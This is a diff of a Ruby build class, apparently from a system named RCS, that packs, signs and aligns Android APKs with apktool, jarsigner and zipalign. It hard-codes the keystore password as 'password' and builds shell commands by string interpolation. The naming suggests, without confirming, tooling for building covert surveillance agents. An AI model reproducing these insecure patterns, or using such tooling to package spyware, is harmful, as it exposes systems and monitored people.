@@ -5,8 +5,6 @@
 # from RCS::Common
 require 'rcs-common/trace'
 
-require 'find'
-
 module RCS
 module DB
 
@@ -53,37 +51,46 @@ class BuildAndroid < Build
 
     apktool = path('apktool.jar')
     apk = path('output.apk')
-    core = path('install.apk')
 
-    File.chmod(0755, path('aapt'))
-    File.chmod(0755, path('zipalign'))
+    File.chmod(0755, path('aapt')) if File.exist? path('aapt')
 
     # add to the PATH the current temp dir since the utility aapt is inside it
     ENV['PATH'] += ":#{@tmpdir}"
 
     system("java -jar #{apktool} b #{@tmpdir}/apk #{apk}")  or raise("cannot pack with apktool")
 
-    CrossPlatform.exec path('zipalign'), "-f 4 #{apk} #{core}" or raise("cannot align apk")
-
-    File.delete(apk)
-
     # cannot use gsub! because it is a frozen tring
     ENV['PATH'] = ENV['PATH'].gsub ":#{@tmpdir}", ''
 
-    if File.exist?(core)
-      @outputs = ['install.apk']
+    if File.exist?(apk)
+      @outputs = ['output.apk']
     else
       raise "pack failed."
     end
 
   end
 
+  def sign(params)
+    trace :debug, "Build: signing with #{Config::CONF_DIR}/android.keystore"
+
+    apk = path(@outputs.first)
+    core = path('install.apk')
+
+    system("jarsigner -keystore #{Config::CONF_DIR}/android.keystore -storepass password -keypass password #{apk} ServiceCore")  or raise("cannot sign with jarsigner")
+
+    File.chmod(0755, path('zipalign')) if File.exist? path('zipalign')
+    CrossPlatform.exec path('zipalign'), "-f 4 #{apk} #{core}" or raise("cannot align apk")
+
+    File.delete(apk)
+
+    @outputs = ['install.apk']
+  end
 
   def pack(params)
     trace :debug, "Build: pack: #{params}"
 
     Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
-      z.file.open('install.apk', "w") { |f| f.write File.open(path('install.apk'), 'rb') {|f| f.read} }
+      z.file.open('install.apk', "w") { |f| f.write File.open(path(@outputs.first), 'rb') {|f| f.read} }
     end
 
     # this is the only file we need to output after this point
